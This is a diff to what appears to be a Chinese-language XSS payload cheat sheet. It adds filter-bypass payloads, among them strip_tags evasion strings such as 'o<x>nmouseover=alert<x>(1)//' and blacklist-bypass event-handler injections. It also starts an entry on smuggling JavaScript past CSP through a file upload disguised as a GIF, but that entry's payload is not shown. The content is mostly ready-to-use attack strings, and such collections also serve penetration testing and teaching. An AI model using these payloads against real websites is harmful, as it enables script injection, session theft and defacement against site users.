@@ -303,11 +303,20 @@ PoC URL必须包含以下之一： <br>
 ${alert(1)}<svg onload=eval('`//'+URL)>
 ```
 **48.HTML Injection - Inline Alternative (HTML注入-内联替代)** <br>
-用于绕过黑名单。<br>
+以下payload用于绕过黑名单。<br>
 ```
 "onpointerover=alert(1) //
 "autofocus onfocusin=alert(1) //
 ```
+**49.Strip-Tags Based Bypass (基于去除标签的绕过)** <br>
+以下payload用于,当过滤器filter去掉<and>标签字符之间的任何内容时进行测试，如PHP的`strip_tags()`功能,但仅限内联注入 <br>
+```
+"o<x>nmouseover=alert<x>(1)//
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+```
+**50.File Upload Injection – HTML/js GIF Disguise (文件上传注入- HTML/js GIF伪装)** <br>
+以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为"xss.gif"或"xss.js"（用于严格的MIME检查）。这是PHP的image/gif文件,它可以通过`<link rel=import href=xss.gif>`（也称为"xss.js"）或`<script src=xss.js></script>`导入到目标web应用。<br>
+
 
 ## 致谢
 **英文议题作者：** <br>
